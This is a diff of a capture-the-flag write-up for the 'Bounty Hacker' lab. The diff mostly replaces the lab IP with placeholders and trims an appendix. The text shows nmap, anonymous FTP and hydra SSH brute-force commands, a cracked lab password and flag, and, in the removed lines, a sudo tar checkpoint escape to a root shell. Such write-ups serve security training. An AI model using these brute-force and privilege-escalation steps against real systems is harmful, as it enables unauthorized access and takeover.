@@ -7,13 +7,15 @@ Date: April 9, 2025
 Difficulty: ⭐ Easy
 
 📘 Overview
-The Bounty Hacker room places you in the role of a digital bounty hunter targeting a cybercriminal syndicate. You’ll enumerate a server, access files via FTP, crack credentials, and escalate to root using a misconfigured sudo permission. A great beginner-friendly room covering foundational pentesting techniques like recon, password reuse, and privilege escalation.
+The Bounty Hacker room places you in the role of a digital bounty hunter targeting a cybercriminal syndicate. 
+You’ll enumerate a server, access files via FTP, crack credentials, and escalate to root using a misconfigured sudo permission. 
+A great beginner-friendly room covering foundational pentesting techniques like recon, password reuse, and privilege escalation.
 
 🌐 Information Gathering
-Target IP: 10.10.226.123
+Target IP: "Grab ip from rooms machine"
 
 🔎 Nmap Scan
-nmap -sV -sC 10.10.226.123
+nmap -sV -sC <target-ip>
 
 Ports Discovered:
 21/tcp open  ftp     vsftpd 3.0.3 (anonymous login allowed)
@@ -30,7 +32,7 @@ Ports Discovered:
 
 📂 FTP Access
 
-ftp 10.10.226.123
+ftp <target-ip>
 Name: anonymous
 
 📁 Files Discovered
@@ -59,17 +61,14 @@ A custom list of potential passwords — likely reused creds.
 
 Used locks.txt as a password list with hydra to crack lin's SSH credentials:
 
-hydra -l lin -P locks.txt ssh://10.10.226.123
+hydra -l lin -P locks.txt ssh://<target-ip>
 
 received password: RedDr4gonSynd1cat3
 
 ✅ Login successful!
 🔐 SSH Access
 
-ssh lin@10.10.226.123
-
-Welcome to Ubuntu 16.04.6 LTS
-Last login: Sun Jun  7 22:23:41 2020
+ssh lin@<target-ip>
 
 🏁 User Flag
 📍 Location
@@ -120,21 +119,6 @@ THM{80UN7Y_h4cK3r}
 
     Privilege escalation doesn’t always require fancy exploits — just clever use of what's already there
 
-🔧 Tools Used
-Tool	Purpose
-nmap	Recon & service enumeration
-ftp	File retrieval
-hydra	SSH brute-force using locks.txt
-ssh	Remote access
-sudo	Privilege escalation (via tar)
-🧩 Appendix
-🔗 Useful Commands
-
-nmap -sV -sC <target-ip>
-ftp <target-ip>
-hydra -l lin -P locks.txt ssh://<target-ip>
-ssh lin@<target-ip>
-sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 📁 Key Files
 
@@ -142,4 +126,5 @@ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
     task.txt — username clue (lin)
 
-    🧠 Pro Tip: When in doubt, check for common misconfigurations, try known wordlists, and always check sudo -l. You'd be surprised how often root is just sitting there waiting.
+
+🧠 Pro Tip: When in doubt, check for common misconfigurations, try known wordlists, and always check sudo -l. You'd be surprised how often root is just sitting there waiting.
